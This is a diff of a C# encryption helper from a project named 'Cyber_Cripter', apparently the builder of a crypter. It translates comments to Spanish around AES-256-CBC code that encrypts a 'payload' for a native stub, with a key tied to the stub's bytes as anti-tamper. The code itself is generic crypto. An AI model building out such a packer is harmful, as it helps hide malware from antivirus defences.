@@ -4,15 +4,18 @@ using System.Security.Cryptography;
 namespace Cyber_Cripter
 {
     /// <summary>
-    /// Crypto primitives used by the builder. The byte layout and parameters
-    /// here MUST stay in sync with what the native stub re-implements via
-    /// Windows CNG (BCrypt) on the decrypt side.
+    /// IMPORTANTE: La implementación de la encriptación debe coincidir con la implementación de la desencriptación por parte del Stub para su funcionamiento.
     /// </summary>
     internal static class Encryption
     {
         /// <summary>
-        /// AES-256-CBC encrypt with PKCS#7 padding. Matches BCryptEncrypt with
-        /// BCRYPT_AES_ALGORITHM, BCRYPT_CHAIN_MODE_CBC, BCRYPT_BLOCK_PADDING.
+        /// Cifra un bloque de datos utilizando el algoritmo AES-256 en modo CBC
+        /// con relleno PKCS#7.
+        /// 
+        /// La configuración empleada coincide con la utilizada por el stub
+        /// mediante BCrypt (BCRYPT_AES_ALGORITHM, BCRYPT_CHAIN_MODE_CBC y
+        /// BCRYPT_BLOCK_PADDING), garantizando que ambos componentes sean
+        /// compatibles.
         /// </summary>
         public static byte[] EncryptAes256Cbc(byte[] plaintext, byte[] key, byte[] iv)
         {
@@ -36,8 +39,10 @@ namespace Cyber_Cripter
             }
         }
 
+
         /// <summary>
-        /// SHA-256 over a single buffer. Returns the full 32-byte digest.
+        /// Calcula el hash SHA-256 de un bloque de datos.
+        /// Se utiliza para construir la Key.
         /// </summary>
         public static byte[] Sha256(byte[] data)
         {
@@ -48,17 +53,16 @@ namespace Cyber_Cripter
         }
 
         /// <summary>
-        /// Re-implements the stub's key derivation:
+        /// Deriva la clave AES empleada para cifrar el payload.
+        /// La clave se obtiene aplicando SHA-256 sobre la concatenación de:
         ///     SHA256( heap_marker(8) || stubBytes[0..hashRegion] || timestamp(8 LE) )
-        /// The stub bytes inside the hash give anti-tamper: any modification of
-        /// the hashed prefix invalidates the resulting key.
         /// </summary>
         public static byte[] DeriveKey(byte[] heapMarker, byte[] stubBytes, int hashRegion, ulong timestamp)
         {
             byte[] buf = new byte[8 + hashRegion + 8];
             System.Buffer.BlockCopy(heapMarker, 0, buf, 0, 8);
             System.Buffer.BlockCopy(stubBytes,  0, buf, 8, hashRegion);
-            // little-endian uint64 timestamp (matches MSVC x64 layout of g_meta.timestamp)
+            // little-endian uint64 timestamp (coincide con MSVC x64 layout de g_meta.timestamp)
             for (int i = 0; i < 8; i++) buf[8 + hashRegion + i] = (byte)(timestamp >> (8 * i));
             return Sha256(buf);
         }
